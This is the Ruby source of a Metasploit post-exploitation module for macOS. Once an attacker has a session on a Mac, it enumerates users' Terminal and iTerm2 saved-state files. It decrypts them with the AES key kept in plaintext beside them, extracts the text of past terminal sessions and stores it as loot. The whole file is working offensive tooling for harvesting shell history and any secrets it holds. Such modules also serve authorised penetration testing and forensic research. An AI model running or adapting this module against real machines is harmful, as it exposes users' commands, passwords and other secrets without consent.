##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'openssl'
require 'json'
require 'rexml/document'
require 'shellwords'
require 'time'

# Binary plist parser ported from bplist.py by Willi Ballenthin
# https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04
#
# Supports all token types used by macOS SavedState artifacts:
#   null, bool, int, real, date, data, ASCII/Unicode string, UID, array, dict
class BplistParser
  MAGIC = 'bplist00'.b.freeze
  UID = Struct.new(:value)

  class ParseError < StandardError; end

  def initialize(data)
    @buf = data.b
  end

  def parse
    raise ParseError, 'Not a binary plist' unless @buf[0, 8] == MAGIC
    raise ParseError, 'Data too short' if @buf.length < 40

    # Trailer layout (last 32 bytes, all big-endian):
    #   6 unused | offset_size (1) | ref_size (1) | num_objects (8) | top_object (8) | offset_table_offset (8)
    _unused, offset_size, ref_size, num_objects, top_object, offset_table_offset =
      @buf[-32..].unpack('a6CCQ>Q>Q>')

    @ref_size = ref_size
    @object_offsets = @buf[offset_table_offset, num_objects * offset_size]
                      .unpack(uint_fmt(offset_size) * num_objects)
    @objects = Array.new(num_objects)
    @parsed = Array.new(num_objects, false)

    read_object(top_object)
  rescue ParseError
    raise
  rescue IndexError, TypeError, ArgumentError, RangeError, NoMethodError => e
    raise ParseError, "Parse failed: #{e}"
  end

  private

  def uint_fmt(size)
    case size
    when 1 then 'C'
    when 2 then 'n'
    when 4 then 'N'
    when 8 then 'Q>'
    else raise ParseError, "Unsupported integer size: #{size}"
    end
  end

  # When token_l == 0xF the real count is stored inline as a sized integer.
  # Returns [new_pos, count].
  def read_extended_count(pos)
    m = @buf.getbyte(pos) & 0x3
    s = 1 << m
    [pos + 1 + s, @buf[pos + 1, s].unpack1(uint_fmt(s))]
  end

  def resolve_count(pos, token_l)
    token_l == 0xF ? read_extended_count(pos) : [pos, token_l]
  end

  def read_object(ref)
    return @objects[ref] if @parsed[ref]

    offset = @object_offsets[ref]
    token = @buf.getbyte(offset)
    token_h = token & 0xF0
    token_l = token & 0x0F
    pos = offset + 1

    obj = case token
          when 0x00 then nil
          when 0x08 then false
          when 0x09 then true
          when 0x0F then ''.b
          else
            case token_h
            when 0x10 # int
              s = 1 << token_l
              token_l >= 3 ? @buf[pos, s].unpack1('q>') : @buf[pos, s].unpack1(uint_fmt(s))

            when 0x20 # real
              case token_l
              when 2 then @buf[pos, 4].unpack1('g')
              when 3 then @buf[pos, 8].unpack1('G')
              end

            when 0x30 # date (token 0x33)
              Time.utc(2001, 1, 1) + @buf[pos, 8].unpack1('G')

            when 0x40 # data — return as binary String
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s].b

            when 0x50 # ASCII string
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s].encode('UTF-8', 'ASCII-8BIT', invalid: :replace, undef: :replace)

            when 0x60 # UTF-16BE string
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s * 2].encode('UTF-8', 'UTF-16BE', invalid: :replace, undef: :replace)

            when 0x80 # UID must remain distinct from an ordinary integer
              UID.new(@buf[pos, 1 + token_l].unpack('C*').reduce(0) { |acc, byte| (acc << 8) | byte })

            when 0xA0 # array
              pos, s = resolve_count(pos, token_l)
              refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              arr = []
              @objects[ref] = arr
              @parsed[ref] = true
              refs.each { |r| arr << read_object(r) }
              arr

            when 0xD0 # dict
              pos, s = resolve_count(pos, token_l)
              key_refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              pos += s * @ref_size
              val_refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              hsh = {}
              @objects[ref] = hsh
              @parsed[ref] = true
              key_refs.zip(val_refs).each { |k, v| hsh[read_object(k)] = read_object(v) }
              hsh

            else
              raise ParseError, "Unknown plist token: 0x#{token.to_s(16)}"
            end
          end

    @objects[ref] = obj unless @parsed[ref]
    @parsed[ref] = true
    obj
  end
end

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'macOS Terminal/iTerm2 Saved State Recovery',
        'Description' => %q{
          This module enumerates the saved state files for the Terminal and iTerm2
          applications on macOS 10.7-14, and Terminal's daemon container saved
          state on macOS 15 and later (requires Full Disk Access).
          These files are encrypted with AES-128-CBC, but
          the key is stored in plaintext in the accompanying windows.plist file.
          The decrypted files contain a copy of what was sent to and from the
          terminal, which may include sensitive information.

          Tested against macOS 11.7.11.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die',                                        # msf module
          'Willi Ballenthin <willi.ballenthin@gmail.com>', # PoC
          'kshitij Kumar <kshitij.kumar@crowdstrike.com>'  # PoC
        ],
        'Platform' => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'References' => [
          # dead url, not sure what happened to it, leaving it here though since it was one of the original sources
          # ['URL', 'https://github.com/CrowdStrike/automactc/blob/master/modules/mod_terminalstate_v100.py'],
          ['URL', 'https://www.crowdstrike.com/en-us/blog/reconstructing-command-line-activity-on-macos/'],
          ['URL', 'https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04'],
          ['ATT&CK', Mitre::Attack::Technique::T1552_003_BASH_HISTORY] # Shell history according to the website https://attack.mitre.org/techniques/T1552/003/
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('USER', [true, 'User to target, or ALL for all users', 'ALL'])
    ])
  end

  SAVED_STATE_APPS = [
    'com.apple.Terminal.savedState',
    'com.googlecode.iterm2.savedState'
  ].freeze

  def parse_binary_plist(data)
    BplistParser.new(data).parse
  end

  # Metadata plists can be XML or binary; decrypted keyed archives remain binary.
  def parse_plist(data)
    return parse_binary_plist(data) if data.start_with?('bplist00')
    raise BplistParser::ParseError, 'Unrecognized plist format' unless data.start_with?('<?xml')

    root = REXML::Document.new(data).root
    unless root && root.name == 'plist' && root.elements.size == 1
      raise BplistParser::ParseError, 'Invalid XML plist root'
    end

    parse_xml_plist_value(root.elements[1])
  rescue REXML::ParseException, ArgumentError
    raise BplistParser::ParseError, 'Invalid XML plist'
  end

  def parse_xml_plist_value(element)
    case element.name
    when 'array'
      element.elements.map { |entry| parse_xml_plist_value(entry) }
    when 'dict'
      entries = element.elements.to_a
      raise BplistParser::ParseError, 'Invalid XML plist dictionary' unless entries.length.even?

      entries.each_slice(2).each_with_object({}) do |(key, value), result|
        raise BplistParser::ParseError, 'Invalid XML plist dictionary key' unless key.name == 'key'

        result[key.text.to_s] = parse_xml_plist_value(value)
      end
    when 'string' then element.text.to_s
    when 'data' then Base64.strict_decode64(element.text.to_s.delete(" \t\r\n"))
    when 'integer' then Integer(element.text.to_s, 10)
    when 'real' then Float(element.text.to_s)
    when 'date' then Time.iso8601(element.text.to_s)
    when 'true' then true
    when 'false' then false
    else
      raise BplistParser::ParseError, 'Unsupported XML plist value'
    end
  end

  def terminal_container_paths(user)
    paths = []
    containers = "/Users/#{user}/Library/Daemon Containers"
    return paths unless directory?(containers)

    # Full Disk Access is required to read the macOS 15+ daemon container path.
    directory = session.type == 'meterpreter' ? containers : Shellwords.escape(containers)
    dir(directory).each do |container|
      next if ['.', '..'].include?(container)

      saved_state = "#{containers}/#{container}/Data/Library/Saved Application State"
      mapping_file = "#{saved_state}/ApplicationMapping.plist"
      next unless file?(mapping_file)

      begin
        mapping = parse_plist(read_file(mapping_file))
        next unless mapping.is_a?(Array)

        # The flat array alternates an application dictionary and its saved-state UUID.
        mapping.each_slice(2) do |application, uuid|
          next unless application.is_a?(Hash) && application['protected'].is_a?(Hash)
          next unless application['protected']['signingIdentifier'] == 'com.apple.Terminal'
          next unless uuid.is_a?(String) && !uuid.empty?

          paths << "#{saved_state}/#{uuid}.savedState"
        end
      rescue StandardError => e
        vprint_warning("Unable to read #{mapping_file}: #{e}")
      end
    end
    paths.uniq
  rescue StandardError => e
    vprint_warning("Unable to enumerate #{containers} (Full Disk Access may be required): #{e}")
    paths
  end

  # Recursively converts parsed plist values to JSON-safe types.
  # Binary strings become "hex://..." since they may not be valid UTF-8.
  # Time objects become ISO-8601 strings. Everything else maps directly.
  def plist_to_json_value(obj)
    case obj
    when BplistParser::UID then { 'CF$UID' => obj.value }
    when Hash then obj.transform_values { |v| plist_to_json_value(v) }
    when Array then obj.map { |v| plist_to_json_value(v) }
    when String
      obj.encoding == ::Encoding::ASCII_8BIT ? "hex://#{obj.unpack1('H*')}" : obj
    when Time then obj.utc.iso8601
    else obj
    end
  end

  def aes128_cbc_decrypt(key, ciphertext, iv = "\x00" * 16)
    cipher = OpenSSL::Cipher.new('AES-128-CBC')
    cipher.decrypt
    cipher.key = key
    # The undocumented IV is all zero bytes; a random IV corrupts block 0.
    cipher.iv = iv
    cipher.padding = 0
    cipher.update(ciphertext) + cipher.final
  end

  # A recognized _NSWindow record must supersede earlier state even if its envelope is invalid.
  class WindowEnvelopeError < BplistParser::ParseError; end

  # Parses the custom struct wrapping the NSKeyedArchiver bplist inside a decrypted window state.
  #
  # Layout (all big-endian):
  #   uint32_t unk1
  #   uint32_t class_name_size
  #   char     class_name[class_name_size]
  #   char     magic[4]       # 'rchv'
  #   uint32_t plist_size
  #   uint8_t  plist[plist_size]
  #
  # Returns the raw bplist bytes, or nil for a key other than _NSWindow.
  def parse_window_header(buf)
    buf = buf.b
    raise BplistParser::ParseError, 'Truncated window envelope' if buf.bytesize < 16

    _unk1, class_name_size = buf.unpack('NN')
    offset = 8 + class_name_size
    raise BplistParser::ParseError, 'Truncated window envelope key' if offset > buf.bytesize
    return nil unless buf[8, class_name_size] == '_NSWindow'

    raise WindowEnvelopeError, 'Truncated window envelope fields' if offset + 8 > buf.bytesize

    magic = buf[offset, 4]
    offset += 4
    raise WindowEnvelopeError, 'Invalid window envelope tag' unless magic == 'rchv'

    plist_size = buf[offset, 4].unpack1('N')
    offset += 4
    raise WindowEnvelopeError, 'Truncated window envelope plist' if plist_size > buf.bytesize - offset

    buf[offset, plist_size]
  end

  # Parses one NSCR window state blob, finds its decryption key in windows_meta,
  # decrypts it, and returns [size, window_meta, inner_plist_bytes].
  # Returns [size, window_meta, nil, error] for a recognized but malformed _NSWindow envelope.
  # Returns [size, nil, nil] if the window metadata is missing.
  # Returns nil if the magic/version is invalid.
  def decrypt_window(windows_meta, buf)
    buf = buf.b
    magic = buf[0, 4]
    version = buf[4, 4]
    return nil unless magic == 'NSCR' && version == '1000'

    window_id, size = buf[8, 8].unpack('NN')
    ciphertext = buf[0x10, size - 0x10]

    window = windows_meta.find { |w| w['NSWindowID'] == window_id }
    unless window
      vprint_warning("  No metadata for window ID #{window_id}, skipping")
      return [size, nil, nil]
    end

    # NSDataKey is the raw 16-byte AES-128 key stored as binary data in the plist
    key = window['NSDataKey']
    plaintext = aes128_cbc_decrypt(key, ciphertext)
    plist_bytes = parse_window_header(plaintext)
    vprint_status("  Skipping non-_NSWindow record for window ID #{window_id}") unless plist_bytes

    [size, window, plist_bytes]
  rescue WindowEnvelopeError => e
    [size, window, nil, e.message]
  rescue OpenSSL::Cipher::CipherError, ArgumentError, BplistParser::ParseError => e
    vprint_warning("  Failed to decrypt record for window ID #{window_id}: #{e}")
    [size, nil, nil]
  end

  # NSCR1000 records include their 16-byte header in the total length.
  # Select the last _NSWindow record for each ID before parsing any archives.
  # Retain malformed candidates until selection ends so older state cannot become current.
  def latest_window_records(windows_meta, data)
    records = {}
    pos = 0
    while pos < data.bytesize
      if data.bytesize - pos < 16
        print_warning("  Torn final record header at offset #{pos}; stopping")
        break
      end
      unless data[pos, 8] == 'NSCR1000'
        print_warning("  Invalid record header at offset #{pos}; stopping")
        break
      end

      window_id, size = data[pos + 8, 8].unpack('NN')
      if size <= 16
        print_warning("  Invalid record length #{size} at offset #{pos}; stopping")
        break
      end
      if size > data.bytesize - pos
        print_warning("  Torn final record for window ID #{window_id} at offset #{pos}; stopping")
        break
      end

      _size, window, plist_bytes, error = decrypt_window(windows_meta, data[pos, size])
      if window && (plist_bytes || error)
        previous = records[window_id]
        if previous
          vprint_status("  Window ID #{window_id}: choosing _NSWindow record at offset #{pos}; skipping earlier record at offset #{previous[:offset]}")
        end
        records[window_id] = { window: window, plist_bytes: plist_bytes, offset: pos, error: error }
      end
      pos += size
    end
    records.delete_if do |window_id, record|
      next false unless record[:error]

      print_warning("  Window ID #{window_id}: newest _NSWindow state at offset #{record[:offset]} was malformed (#{record[:error]}); skipping window")
      true
    end
  end

  # Resolve only typed UIDs through $objects; ordinary integers are values.
  def resolve_archive_value(value, objects, resolved = {})
    case value
    when BplistParser::UID
      index = value.value
      return nil if index.zero?
      raise BplistParser::ParseError, "Invalid archive UID #{index}" unless index.between?(0, objects.length - 1)
      return resolved[index] if resolved.key?(index)

      resolved[index] = nil # Break cycles in the archived object graph.
      resolved[index] = resolve_archive_value(objects[index], objects, resolved)
    when Array
      value.map { |entry| resolve_archive_value(entry, objects, resolved) }
    when Hash
      if value.key?('NS.keys')
        keys = resolve_archive_value(value['NS.keys'], objects, resolved)
        values = resolve_archive_value(value['NS.objects'], objects, resolved)
        unless keys.is_a?(Array) && values.is_a?(Array) && keys.length == values.length
          raise BplistParser::ParseError, 'Invalid archived NSDictionary'
        end

        keys.zip(values).to_h
      elsif value.key?('NS.objects')
        resolve_archive_value(value['NS.objects'], objects, resolved)
      elsif value.key?('NS.string')
        resolve_archive_value(value['NS.string'], objects, resolved)
      elsif value.key?('NS.data')
        resolve_archive_value(value['NS.data'], objects, resolved)
      else
        value.reject { |key, _entry| key == '$class' }.transform_values { |entry| resolve_archive_value(entry, objects, resolved) }
      end
    else
      value
    end
  end

  # Follow $top -> TTWindowState -> Window Settings, preserving tab boundaries.
  def extract_terminal_tabs(state)
    objects = state['$objects']
    return [] unless objects.is_a?(Array)

    top = resolve_archive_value(state['$top'], objects)
    return [] unless top.is_a?(Hash)

    # Archives may put the TTWindowState dictionary beneath the standard root key.
    root = top['root'] || top
    return [] unless root.is_a?(Hash)

    window_state = root['TTWindowState']
    return [] unless window_state.is_a?(Hash) && window_state['Window Settings'].is_a?(Array)

    window_state['Window Settings'].each_with_object([]) do |tab, tabs|
      next unless tab.is_a?(Hash)

      rows = tab['Tab Contents v2']
      next unless rows.is_a?(Array)

      # Odd entries are 16-byte attribute runs, even when a row is also 16 bytes.
      content = rows.each_slice(2).map do |row, _attributes|
        # Trim only trailing ASCII spaces, preserving embedded LFs and other whitespace.
        row.is_a?(String) ? row.dup.force_encoding('UTF-8').scrub.reverse.sub(/\A +/, '').reverse : ''
      end.join("\n")
      content << "\n" unless rows.empty? # The reference terminates every row, including the last.
      tabs << { content: content, working_directory: tab['Tab Working Directory URL String'] }
    end
  end

  def process_saved_state(path)
    windows_plist = "#{path}/windows.plist"
    data_file = "#{path}/data.data"

    unless file?(windows_plist) && file?(data_file)
      vprint_status("Not found: #{path}")
      return
    end

    print_status("Processing: #{path}")

    windows_meta = parse_plist(read_file(windows_plist))
    data = read_file(data_file).b
    latest_window_records(windows_meta, data).each do |window_id, record|
      window = record[:window]
      title = window.fetch('NSTitle', '(no title)')
      vprint_status("  Window: #{title}")

      begin
        state = parse_binary_plist(record[:plist_bytes])
        state_json = JSON.pretty_generate(plist_to_json_value(state))
        tabs = extract_terminal_tabs(state)
      rescue BplistParser::ParseError, JSON::GeneratorError => e
        print_warning("  Window ID #{window_id}: newest _NSWindow state at offset #{record[:offset]} was malformed (#{e}); skipping window")
        next
      end

      vprint_status("  Using last _NSWindow record for window ID #{window_id} at offset #{record[:offset]}")

      loot_json = store_loot(
        'osx.terminal.window.json',
        'application/json',
        session,
        state_json,
        'window_state.json',
        "macOS Terminal window state (JSON) - #{title}"
      )
      vprint_status("  Stored window state JSON to: #{loot_json}")

      tabs.each_with_index do |tab, index|
        content = tab[:content]
        next if content.empty?

        print_good("  Recovered terminal history for window: #{title}, tab #{index + 1}")
        directory = tab[:working_directory]
        print_status("  Working directory: #{directory}") if directory
        print_status(content)

        loot = store_loot(
          'osx.terminal.history',
          'text/plain',
          session,
          content,
          'terminal_history.txt',
          "macOS terminal history - #{title}, tab #{index + 1} (#{directory})"
        )
        print_good("  Stored to: #{loot}")
      end
    end
  rescue BplistParser::ParseError => e
    print_error("Failed to parse #{windows_plist}: #{e}")
  end

  def run
    users = if datastore['USER'] == 'ALL'
              cmd_exec('ls /Users').split
            else
              [datastore['USER']]
            end

    users.each do |user|
      SAVED_STATE_APPS.each do |app|
        process_saved_state("/Users/#{user}/Library/Saved Application State/#{app}")
      end
      terminal_container_paths(user).each { |path| process_saved_state(path) }
    end
  end
end
